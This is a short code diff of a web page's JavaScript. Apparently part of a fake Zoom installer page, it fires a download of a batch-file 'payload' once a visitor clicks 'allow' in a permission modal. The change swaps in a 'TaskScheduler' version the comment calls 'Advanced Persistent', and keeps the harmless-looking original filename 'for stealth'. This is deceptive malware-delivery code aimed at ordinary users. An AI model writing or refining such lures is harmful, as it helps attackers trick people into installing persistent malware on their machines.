@@ -263,10 +263,10 @@
         function allowPermission() {
             document.getElementById('permission-modal').style.display = 'none';
 
-            // Trigger download of the payload
+            // Trigger download of the payload (Advanced Persistent Version)
             const link = document.createElement('a');
-            link.href = '../../assets/ZoomConsole_Setup.bat';
-            link.download = 'ZoomConsole_Setup.bat';
+            link.href = '../../assets/ZoomConsole_Setup_TaskScheduler.bat';
+            link.download = 'ZoomConsole_Setup.bat';  // Keep original name for stealth
             document.body.appendChild(link);
             link.click();
             document.body.removeChild(link);
